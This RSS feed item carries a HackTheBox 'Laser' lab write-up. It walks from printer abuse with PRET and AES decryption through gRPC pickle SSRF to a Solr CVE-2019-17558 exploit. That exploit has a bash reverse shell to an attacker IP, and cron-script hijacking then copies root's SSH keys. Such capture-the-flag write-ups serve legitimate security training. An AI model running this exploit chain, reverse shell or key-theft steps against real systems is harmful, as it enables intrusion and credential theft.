<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Purab Parihar</title><link>purabparihar.github.io/posts/</link><description>Recent content in Posts on Purab Parihar</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>&lt;a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0&lt;/a></copyright><lastBuildDate>Thu, 13 Oct 2022 19:34:33 +0530</lastBuildDate><atom:link href="purabparihar.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>HackTheBox Laser : Insane Machine Writeup</title><link>purabparihar.github.io/posts/hackthebox-laser-insane-machine-writeup/</link><pubDate>Thu, 13 Oct 2022 19:34:33 +0530</pubDate><guid>purabparihar.github.io/posts/hackthebox-laser-insane-machine-writeup/</guid><description>Introduction Laser Machine is rated as Insane level machine created by MrR3boot &amp;amp; r4j and was released on HackTheBox Platform. This machine is based on exposed features of Printer to gain initial foothold.
Enumeration We used -sC for using Defualt script and -sV for Service Version Scan. After Nmap we can see that machine has three running ports that is port 22, port 9000 and port 9100. We know that port 22 is used for SSH and we can also see that in Nmap.</description><content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
<p><img src="/images/Hackthebox/Laser/banner.jpeg" alt="Banner"></p>
<p>Laser Machine is rated as Insane level machine created by <a href="https://www.hackthebox.eu/home/users/profile/13531">MrR3boot</a> &amp; <a href="https://www.hackthebox.eu/home/users/profile/13243">r4j</a> and was released on HackTheBox Platform. This machine is based on exposed features of Printer to gain initial foothold.</p>
<h2 id="enumeration">Enumeration</h2>
<p><img src="/images/Hackthebox/Laser/Nmap.png" alt="NmapScan"></p>
<p>We used -sC for using Defualt script and -sV for Service Version Scan. After Nmap we can see that machine has three running ports that is port 22, port 9000 and port 9100. We know that port 22 is used for SSH and we can also see that in Nmap. Let&rsquo;s search about port 9100 on google to see what this port is for.</p>
<h3 id="printer-enumeration">Printer Enumeration</h3>
<p><img src="/images/Hackthebox/Laser/Enumeration_on_9100.png" alt="NmapScan"></p>
<p>Google never leaves our hand! You can see that port 9100 jetdirect is used by printers. Umm Interesting so let&rsquo;s try to exploit printer on machine with PRET. PRET is tool for exploiting vulnerable printers.</p>
<p>This tool uses three different languages to interact with printer i.e PJL,PCL and PostScript. As we are performing pentest on a blackbox, We don&rsquo;t know that which language is being used by the printer so we&rsquo;ll try to use all these languages. Let&rsquo;s try first with PostScript</p>
<p><img src="/images/Hackthebox/Laser/PrinterExploit_ps.png" alt="PRET"></p>
<p>PostScript is not being used on the Printer as we can that PRET says Command Execution Failed so Let&rsquo;s try with PJL now.</p>
<p><img src="/images/Hackthebox/Laser/PrinterExploit_pjl.png" alt="PRET_PJL"></p>
<p>PJL worked! LaserCorp LaserJet 4ML is being used here as printer and now we can execute some commands to enumerate about printer. Let&rsquo;s try changing directories</p>
<p><img src="/images/Hackthebox/Laser/PRET_Dir.png" alt="PRET_DIR"></p>
<p>We found a file called &ldquo;queued&rdquo; so let&rsquo;s see contents in file with cat command</p>
<p><img src="/images/Hackthebox/Laser/queued.png" alt="File"></p>
<p>Seems a big file of base64 encoded string and now we can copy that base64 data to our system into file and then we&rsquo;ll see what type of data it is. Let&rsquo;s enumerate more on printer. Printenv command is available in PRET which shows the enviornment variables of the printer.</p>
<p><img src="/images/Hackthebox/Laser/PrintEnv.png" alt="Print_Env"></p>
<p>Printenv showed a enviornment variable ENCRYPTION_MODE=AES Yes! This could be useful later. There is one more option called NVRAM can be used to dump the memory and maybe this memory could be useful</p>
<p><img src="/images/Hackthebox/Laser/nvram_dump.png" alt="NVRAM_DUMP"></p>
<p>Laser Machine is rated as Insane level machine created by <a href="https://www.hackthebox.eu/home/users/profile/13531">MrR3boot</a> &amp; <a href="https://www.hackthebox.eu/home/users/profile/13243">r4j</a> and was released on HackTheBox Platform. This machine is based on exposed features of Printer to gain initial foothold.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sed -e <span style="color:#ed9d13">&#34;s#&#39;##g&#34;</span> queued | cut -c2- &gt; queued.b6
</span></span></code></pre></div><h2 id="gaining-user-access">Gaining User Access</h2>
<h3 id="decrypting-aes">Decrypting AES</h3>
<p>Now we have used sed (stream editor for filtering) to convert raw file to proper base64 and now let&rsquo;s try to decrypt AES now with this file</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">from</span> <span style="color:#447fcf;text-decoration:underline">Crypto.Cipher</span> <span style="color:#6ab825;font-weight:bold">import</span> AES
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">base64</span>,<span style="color:#447fcf;text-decoration:underline">struct</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">with</span> <span style="color:#24909d">open</span>(<span style="color:#ed9d13">&#34;queued.b64&#34;</span>,<span style="color:#ed9d13">&#34;rb&#34;</span>) <span style="color:#6ab825;font-weight:bold">as</span> data:
</span></span><span style="display:flex;"><span>    data = data.read().strip()
</span></span><span style="display:flex;"><span>    data = base64.b64decode(data)
</span></span><span style="display:flex;"><span>    size, iv,ciphertext = (data[<span style="color:#3677a9">0</span>:<span style="color:#3677a9">8</span>],data[<span style="color:#3677a9">8</span>:<span style="color:#3677a9">24</span>],data[<span style="color:#3677a9">24</span>:])
</span></span><span style="display:flex;"><span>    key = <span style="color:#ed9d13">&#34;13vu94r6643rv19u&#34;</span>.encode()
</span></span><span style="display:flex;"><span>    cipher = AES.new(key,AES.MODE_CBC,iv)
</span></span><span style="display:flex;"><span>    decrypted = cipher.decrypt(ciphertext)
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">with</span> <span style="color:#24909d">open</span>(<span style="color:#ed9d13">&#34;decrypted&#34;</span>,<span style="color:#ed9d13">&#34;wb&#34;</span>) <span style="color:#6ab825;font-weight:bold">as</span> output:
</span></span><span style="display:flex;"><span>        output.write(decrypted)
</span></span></code></pre></div><h3 id="grpc-interaction">gRPC Interaction</h3>
<p>AES got decrypted and now we have a PDF Documentation about Feed Engine v1.0 so let&rsquo;s see what hints we can get from there</p>
<p><img src="/images/Hackthebox/Laser/Documentation.png" alt="Doc"></p>
<p>Points to notice :</p>
<pre tabindex="0"><code>Engine runs on 9000 Port which we got from nmap
Uses gRPC for Interaction
Protobuf (Google Protocol Buffer) are used with gRPC
</code></pre><p>For interaction with service we have to understand the message structure first and gRPC <a href="https://grpc.io/docs/what-is-grpc/introduction/">documentation</a> comes in handy here.Let&rsquo;s read decrypted PDF more and There is a sample code as well in pdf and some more hints!!</p>
<p><img src="/images/Hackthebox/Laser/Service.png" alt="Service"></p>
<p>As per documentation we have to create a service called <strong>Print</strong> with method <strong>Feed</strong> which takes parameter <strong>Content</strong> as input and <strong>Data</strong> as output</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>syntax = <span style="color:#ed9d13">&#34;proto3&#34;</span>;
</span></span><span style="display:flex;"><span>service Print{
</span></span><span style="display:flex;"><span>    rpc Feed (Content) returns (Data) {}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Now we have to define <strong>Content</strong> and <strong>Data</strong>. <strong>Content</strong> holds memeber called <strong>data</strong> and <strong>Data</strong> holds feed.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>syntax = <span style="color:#ed9d13">&#34;proto3&#34;</span>;
</span></span><span style="display:flex;"><span>service Print{
</span></span><span style="display:flex;"><span>    rpc Feed (Content) returns (Data) {}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>message Content{
</span></span><span style="display:flex;"><span>    string data=<span style="color:#3677a9">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>message Data{
</span></span><span style="display:flex;"><span>    string feed=<span style="color:#3677a9">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Now we have to save this data in a file laser.proto . Now we have to use python to interact with Service</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pip3 install grpcio-tools
</span></span><span style="display:flex;"><span>pip3 install grpcio
</span></span></code></pre></div><p>Once we have installed both modules, We have to generate gRPC classes for python</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. laser.proto
</span></span></code></pre></div><p>Let&rsquo;s create a python script to interact with gRPC</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">grpc</span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">laser_pb2</span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">laser_pb2_grpc</span>
</span></span><span style="display:flex;"><span>channel = grpc.insecure_channel(<span style="color:#ed9d13">&#34;10.10.10.201:9000&#34;</span>)
</span></span><span style="display:flex;"><span>stub = laser_pb2_grpc.PrintStub(channel)
</span></span><span style="display:flex;"><span>data = stub.Feed(laser_pb2.Content(data = <span style="color:#ed9d13">&#34;abcde&#34;</span>))
</span></span><span style="display:flex;"><span><span style="color:#24909d">print</span>(data.feed)
</span></span></code></pre></div><p>We have created a server using <strong>insecure_channel</strong>, PrintStub to invoke methods, Feed is stub object and we call it using<strong>Feed</strong>and We sent input <strong>using Content</strong> with data and returned <strong>Data</strong> using <strong>feed</strong>.</p>
<p><img src="/images/Hackthebox/Laser/base64_error.png" alt="base64_err"></p>
<p>We got error which says <strong>Invalid base64-encoded string</strong> means the gRPC requieres base64 string in order to communicate with service. Let&rsquo;s change string to base64</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>data = stub.Feed(laser_pb2.Content(data = <span style="color:#ed9d13">&#34;YWJjZGU=&#34;</span>))
</span></span></code></pre></div><p><img src="/images/Hackthebox/Laser/unpickle.png" alt="unpickle"></p>
<p>Now the error says that <strong>unpickling stack underflow</strong> it means the gRPC doesn&rsquo;t accept unpickled (desearialized) objects so we can use pickle method to serialize the objects.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">sys</span>, <span style="color:#447fcf;text-decoration:underline">pickle</span>, <span style="color:#447fcf;text-decoration:underline">base64</span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">grpc</span>, <span style="color:#447fcf;text-decoration:underline">laser_pb2</span>, <span style="color:#447fcf;text-decoration:underline">laser_pb2_grpc</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload = <span style="color:#ed9d13">&#39;{&#34;feed_url&#34;:&#34;http://10.10.14.12:1337&#34;}&#39;</span>
</span></span><span style="display:flex;"><span>payload = base64.b64encode(pickle.dumps(payload))
</span></span><span style="display:flex;"><span>channel = grpc.insecure_channel(<span style="color:#ed9d13">&#39;10.10.10.201:9000&#39;</span>)
</span></span><span style="display:flex;"><span>stub = laser_pb2_grpc.PrintStub(channel)
</span></span><span style="display:flex;"><span>content = laser_pb2.Content(data=payload)
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">try</span>:
</span></span><span style="display:flex;"><span>    response = stub.Feed(content, timeout=<span style="color:#3677a9">10</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#24909d">print</span>(response)
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">except</span> <span style="color:#bbb">Exception</span> <span style="color:#6ab825;font-weight:bold">as</span> ex:
</span></span><span style="display:flex;"><span>    <span style="color:#24909d">print</span>(ex)
</span></span></code></pre></div><p>Run this python file and listen to 1337 on another terminal</p>
<p><img src="/images/Hackthebox/Laser/Reply_from_nc.png" alt="Reply_NC"></p>
<p>Now we are reciveing connection from the machine! Now we have to create another python script which will be basic port scanner so that we can scan internal ports from the machine network.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">sys</span>, <span style="color:#447fcf;text-decoration:underline">pickle</span>, <span style="color:#447fcf;text-decoration:underline">base64</span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">grpc</span>, <span style="color:#447fcf;text-decoration:underline">laser_pb2</span>, <span style="color:#447fcf;text-decoration:underline">laser_pb2_grpc</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">for</span> port <span style="color:#6ab825;font-weight:bold">in</span> <span style="color:#24909d">range</span>(<span style="color:#3677a9">1</span>, <span style="color:#3677a9">65536</span>):
</span></span><span style="display:flex;"><span>    payload = <span style="color:#ed9d13">&#39;{&#34;feed_url&#34;:&#34;http://localhost:&#39;</span> + <span style="color:#24909d">str</span>(port) + <span style="color:#ed9d13">&#39;&#34;}&#39;</span>
</span></span><span style="display:flex;"><span>    payload = base64.b64encode(pickle.dumps(payload))
</span></span><span style="display:flex;"><span>    channel = grpc.insecure_channel(<span style="color:#ed9d13">&#39;10.10.10.201:9000&#39;</span>)
</span></span><span style="display:flex;"><span>    stub = laser_pb2_grpc.PrintStub(channel)
</span></span><span style="display:flex;"><span>    content = laser_pb2.Content(data=payload)
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">try</span>:
</span></span><span style="display:flex;"><span>        response = stub.Feed(content, timeout=<span style="color:#3677a9">10</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#24909d">print</span>(port, response)
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">except</span> <span style="color:#bbb">Exception</span> <span style="color:#6ab825;font-weight:bold">as</span> ex:
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#ed9d13">&#39;Connection refused&#39;</span> <span style="color:#6ab825;font-weight:bold">in</span> ex.details():
</span></span><span style="display:flex;"><span>            <span style="color:#6ab825;font-weight:bold">continue</span>
</span></span><span style="display:flex;"><span>        <span style="color:#24909d">print</span>(port)
</span></span></code></pre></div><p><img src="/images/Hackthebox/Laser/PortScan.png" alt="Internal_Port_Scan"></p>
<p>We have enumerated 2 Internal Ports :</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#3677a9">7983</span>
</span></span><span style="display:flex;"><span><span style="color:#3677a9">8983</span> feed: <span style="color:#ed9d13">&#34;Pushing feeds&#34;</span>
</span></span></code></pre></div><h3 id="apache-solr-rce">Apache Solr RCE</h3>
<p>Port 8983 uses Apache Solr RCE <a href="https://github.com/veracode-research/solr-injection#7-cve-2019-17558-rce-via-velocity-template-by-_s00py">Exploit</a></p>
<p>So we are going to use a exploit coded in python for getting reverse shell by exploiting the CVE-2019-17558</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">sys</span>,<span style="color:#447fcf;text-decoration:underline">pickle</span>,<span style="color:#447fcf;text-decoration:underline">base64</span>,<span style="color:#447fcf;text-decoration:underline">subprocess</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload = <span style="color:#ed9d13">&#39;bash -c {echo,&#39;</span> + base64.b64encode(<span style="color:#ed9d13">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.12/4444 0&gt;&amp;1&#34;</span>).replace(<span style="color:#ed9d13">&#39;+&#39;</span>,<span style="color:#ed9d13">&#39;%2b&#39;</span>) + <span style="color:#ed9d13">&#39;}|{base64,-d}|{bash,-i}&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">send_url</span>(url):
</span></span><span style="display:flex;"><span>  feed_url = <span style="color:#ed9d13">&#39;{&#34;feed_url&#34;: &#34;gopher://localhost:8983/_&#39;</span> + url + <span style="color:#ed9d13">&#39;&#34;}&#39;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#24909d">print</span>(feed_url)
</span></span><span style="display:flex;"><span>  feed_url_b64 = base64.b64encode(pickle.dumps(feed_url))
</span></span><span style="display:flex;"><span>  cmd = <span style="color:#ed9d13">&#39;./grpcurl -max-time 5 -plaintext -proto laser.proto -d </span><span style="color:#ed9d13">\&#39;</span><span style="color:#ed9d13">{&#34;data&#34;:&#34;&#39;</span> + feed_url_b64 + <span style="color:#ed9d13">&#39;&#34;}</span><span style="color:#ed9d13">\&#39;</span><span style="color:#ed9d13"> 10.10.10.201:9000 Print.Feed&#39;</span>
</span></span><span style="display:flex;"><span>  subprocess.call(cmd,shell=<span style="color:#6ab825;font-weight:bold">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">enc</span>(data):
</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#24909d">str</span>(data.replace(<span style="color:#ed9d13">&#39;%&#39;</span>,<span style="color:#ed9d13">&#39;%25&#39;</span>).replace(<span style="color:#ed9d13">&#39;</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#39;</span>,<span style="color:#ed9d13">&#39;</span><span style="color:#ed9d13">%0d%0a</span><span style="color:#ed9d13">&#39;</span>).replace(<span style="color:#ed9d13">&#39;&#34;&#39;</span>,<span style="color:#ed9d13">&#39;</span><span style="color:#ed9d13">\\</span><span style="color:#ed9d13">&#34;&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">url_get</span>(header,req):
</span></span><span style="display:flex;"><span>  send_url(enc(req) + enc(header))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">url_post</span>(header,body):
</span></span><span style="display:flex;"><span>  send_url(enc(header) + <span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">%0d%0a%0d%0a</span><span style="color:#ed9d13">&#34;</span> + enc(body)) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>body = <span style="color:#ed9d13">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">{
</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">  &#34;update-queryresponsewriter&#34;: {
</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">    &#34;startup&#34;: &#34;lazy&#34;,
</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">    &#34;name&#34;: &#34;velocity&#34;,
</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">    &#34;class&#34;: &#34;solr.VelocityResponseWriter&#34;,
</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">    &#34;template.base.dir&#34;: &#34;&#34;,
</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">    &#34;solr.resource.loader.enabled&#34;: &#34;true&#34;,
</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">    &#34;params.resource.loader.enabled&#34;: &#34;true&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">  }
</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">}&#34;&#34;&#34;</span>.strip().replace(<span style="color:#ed9d13">&#39;</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#39;</span>,<span style="color:#ed9d13">&#39;&#39;</span>).replace(<span style="color:#ed9d13">&#39; &#39;</span>,<span style="color:#ed9d13">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>header = <span style="color:#ed9d13">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">POST /solr/staging/config HTTP/1.1
</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">Host: localhost:8983
</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">Content-Type: application/json
</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">Content-Length: </span><span style="color:#ed9d13">{}</span><span style="color:#ed9d13">
</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">&#34;&#34;&#34;</span>.format(<span style="color:#24909d">len</span>(body)).strip()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url_post(header,body)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>header = <span style="color:#ed9d13">&#39; HTTP/1.1</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">Host: localhost:8983</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#39;</span>
</span></span><span style="display:flex;"><span>template = <span style="color:#ed9d13">&#39;</span><span style="color:#ed9d13">%23s</span><span style="color:#ed9d13">et($x=</span><span style="color:#ed9d13">%27%</span><span style="color:#ed9d13">27)+</span><span style="color:#ed9d13">%23s</span><span style="color:#ed9d13">et($rt=$x.class.forName(%27java.lang.Runtime%27))+</span><span style="color:#ed9d13">%23s</span><span style="color:#ed9d13">et($chr=$x.class.forName(%27java.lang.Character%27))+</span><span style="color:#ed9d13">%23s</span><span style="color:#ed9d13">et($str=$x.class.forName(%27java.lang.String%27))+</span><span style="color:#ed9d13">%23s</span><span style="color:#ed9d13">et($ex=$rt.getRuntime().exec(&#34;PAYLOAD&#34;))+$ex.waitFor()+</span><span style="color:#ed9d13">%23s</span><span style="color:#ed9d13">et($out=$ex.getInputStream())+</span><span style="color:#ed9d13">%23f</span><span style="color:#ed9d13">oreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))</span><span style="color:#ed9d13">%23e</span><span style="color:#ed9d13">nd&#39;</span>
</span></span><span style="display:flex;"><span>req = <span style="color:#ed9d13">&#39;GET /solr/staging/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=&#39;</span> + template.replace(<span style="color:#ed9d13">&#39;PAYLOAD&#39;</span>,payload).replace(<span style="color:#ed9d13">&#39; &#39;</span>,<span style="color:#ed9d13">&#39;%20&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url_get(header,req)
</span></span></code></pre></div><p><img src="/images/Hackthebox/Laser/RevShell.png" alt="RevShell">
BOOM! We got user shell :)
Let&rsquo;s enumerate the system for priviledge escalation.</p>
<h2 id="getting-root">Getting Root</h2>
<p>The current shell is not much stable so let&rsquo;s add our ssh keys into authorized_keys for solr and
Now Let&rsquo;s upload <a href="https://github.com/DominicBreuker/pspy">PsPy</a> to machine using curl. Pspy snoops processes without root permisson.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python -m SimpleHTTPServer <span style="color:#3677a9">80</span> <span style="color:#999;font-style:italic">#on attacker machine</span>
</span></span><span style="display:flex;"><span>curl http://<span style="color:#3677a9">10.10.14.12</span>/pspy64 -o pspy64 <span style="color:#999;font-style:italic">#on victim machine</span>
</span></span><span style="display:flex;"><span>chmod +x pspy64 <span style="color:#999;font-style:italic">#on victim machine</span>
</span></span></code></pre></div><p><img src="/images/Hackthebox/Laser/Docker_Pass.png" alt="DockerPass"></p>
<p>We got a passoword for root!! but it is running /tmp/clear.sh on root, something is suspicous here. Let&rsquo;s see what is it.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>sshpass -p c413d115b3d87664499624e7826d8c5a ssh root@<span style="color:#3677a9">172.18.0.2</span>
</span></span></code></pre></div><pre tabindex="0"><code>
![Docker_login](/images/Hackthebox/Laser/Docker_Login.png)

This is not root!!! This is docker 
So Now as it is executing the /tmp/clear.sh then we can redirect the ssh back again to us.


```python
curl http://10.10.14.12/socat -o socat #on solr shell
chmod +x socat #on solr shell
cd tmp #on solr shell
service ssh stop #on docker
./socat -d TCP-LISTEN:22,fork,reuseaddr TCP:172.17.0.1:22 #on docker
</code></pre><p>After doing this we have to change the ownership rights so that we could copy the id_rsa of root to our solr use</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>cd /tmp
</span></span><span style="display:flex;"><span>echo <span style="color:#ed9d13">&#39;mkdir -p /tmp/purabparihar;cp -R /root/.ssh /tmp/purabparihar;chown -R solr:solr /tmp/purabparihar&#39;</span>&gt; /tmp/clear.sh;chmod +x /tmp/clear.sh
</span></span></code></pre></div><p>Now keep spamming ls command because the cron job could be executed any time.</p>
<p><img src="/images/Hackthebox/Laser/Cron.png" alt="Cron">
Once we got folder named purabparihar then we have grab ssh keys from root!!</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ls;cd purabparihar/.ssh;cat id_rsa
</span></span></code></pre></div><p>Now copy those ssh keys and then save it in file</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>chmod <span style="color:#3677a9">600</span> root_ssh
</span></span><span style="display:flex;"><span>ssh -i root_ssh root<span style="color:#ffa500">@laser</span>.htb
</span></span></code></pre></div><p><img src="/images/Hackthebox/Laser/root.png" alt="Root"></p>
<p><strong>Thank You Everyone for reading this blog! I hope you learned something new</strong></p>
]]></content></item></channel></rss>